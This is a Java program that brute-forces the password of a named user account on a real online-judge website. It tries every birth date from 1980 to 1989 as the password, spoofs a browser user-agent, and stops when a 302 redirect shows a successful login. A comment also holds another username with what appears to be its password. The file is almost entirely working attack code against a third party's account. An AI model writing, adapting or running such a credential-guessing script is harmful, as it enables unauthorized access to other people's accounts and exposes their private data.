package com.test;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;
import org.apache.http.protocol.HTTP;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class GetPassWord {
	public static void main(String[] args) throws Exception, IOException {
		for(int i=1980; i<1990; i++){
			for(int j=1; j<=12; j++){
				for(int k=1; k<=31; k++){
					String passwd =""+ i + ( j<10 ? "0"+j:j+"" ) + ( k<10 ? "0"+k:k+"" );
		//System.out.println(passwd);
			HttpClient client = new DefaultHttpClient();
			HttpPost post = new HttpPost("http://acm.hdu.edu.cn/userloginex.php?action=login");
			HttpParams httpparam = client.getParams();
//			param.setParameter("username", "gaotong2055");
//			param.setParameter("userpass", "19902055");
//			param.setParameter("login", "Sign In");
			
			List<NameValuePair> params = new ArrayList<NameValuePair>();
	        params.add(new BasicNameValuePair("username", "bluebirds"));
	        params.add(new BasicNameValuePair("userpass",passwd));
	        params.add(new BasicNameValuePair("login","Sign In"));
	        
			post.setHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4");
			post.setHeader("accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
			post.setHeader("user-agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36");
			post.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
			
			 HttpResponse response = client.execute(post) ;
			 int stat = response.getStatusLine().getStatusCode();
			 System.out.println(stat);
			 if(stat == 302){
				 System.out.println(passwd);
				 return;
			 }
//			 System.out.println();
//			 BufferedReader br = null;
//			 br = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
//			 String line = null;
//				while ((line = br.readLine()) != null) {
//					System.out.println(line);
//				}
			 Thread.sleep(1000);
			 
				}
			}
		}
		}
		
		
//	/server/apache-tomcat-8.0.0-RC5/webapps/spider/WEB-INF/lib/
//	httpclient-cache-4.2.3.jar:httpclient-4.2.3.jar:httpcore-4.2.2.jar:httpmime-4.2.3.jar
	
	
}
